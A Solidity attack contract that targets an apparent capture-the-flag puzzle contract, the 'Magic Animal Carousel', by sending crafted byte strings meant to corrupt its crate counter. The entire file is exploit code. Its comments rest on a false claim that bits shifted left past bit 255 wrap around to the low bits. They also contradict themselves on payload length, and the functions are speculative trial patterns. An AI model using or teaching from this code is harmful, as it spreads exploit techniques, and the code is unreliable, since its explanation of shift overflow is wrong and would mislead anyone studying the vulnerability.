// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 crateId) external;
    function carousel(uint256 crateId) external view returns (uint256);
    function currentCrateId() external view returns (uint256);
    function MAX_CAPACITY() external view returns (uint16);
}

contract TargetedAttack {
    IMagicAnimalCarousel public target;
    
    constructor(address _target) {
        target = IMagicAnimalCarousel(_target);
    }
    
    function exploit() external {
        // The vulnerability: encodedAnimal << 176 causes overflow
        // Since encodedAnimal can be up to 80 bits (10 bytes after shift)
        // 80 + 176 = 256 bits, which wraps around in uint256
        
        // The goal seems to be to corrupt currentCrateId to reach MAX_CAPACITY
        // MAX_CAPACITY = type(uint16).max = 65535
        
        // Let's overflow in a way that sets specific bits
        bytes memory data = new bytes(10);
        for(uint i = 0; i < 10; i++) {
            data[i] = 0xFF;
        }
        string memory animal = string(data);
        target.setAnimalAndSpin(animal);
    }
    
    function exploitLoop() external {
        // Try to reach MAX_CAPACITY by exploiting the overflow
        uint16 maxCap = target.MAX_CAPACITY();
        
        // The overflow might allow us to jump directly to a high crate ID
        // Let's try multiple attempts with different patterns
        
        // Pattern 1: All ones
        bytes memory data1 = new bytes(10);
        for(uint i = 0; i < 10; i++) {
            data1[i] = 0xFF;
        }
        target.setAnimalAndSpin(string(data1));
        
        // Pattern 2: Specific pattern to target crate ID
        bytes memory data2 = new bytes(10);
        data2[0] = 0xFF;
        data2[1] = 0xFF;
        target.setAnimalAndSpin(string(data2));
    }
    
    function craftSpecificOverflow() external {
        // We need to craft a value that when shifted left 176 bits
        // will wrap around and affect the lower bits (crate ID portion)
        
        // The crate ID is stored in bits 160-175 (16 bits)
        // When we shift left by 176, our data ends up at bits 176-255
        // But since uint256 only has 256 bits, bits 256+ wrap to bits 0+
        
        // So if we have 80 bits of data, shifted left 176:
        // Bits 0-79 of our data end up at bits 176-255
        // But anything beyond bit 255 wraps around
        
        // Let's create data that targets the overflow
        bytes memory payload = new bytes(12); // Max length
        payload[0] = 0xFF;
        payload[1] = 0xFF;
        payload[2] = 0x01;
        
        target.setAnimalAndSpin(string(payload));
    }
    
    function checkState() external view returns (uint256 currentId, uint256 maxCap) {
        currentId = target.currentCrateId();
        maxCap = target.MAX_CAPACITY();
    }
}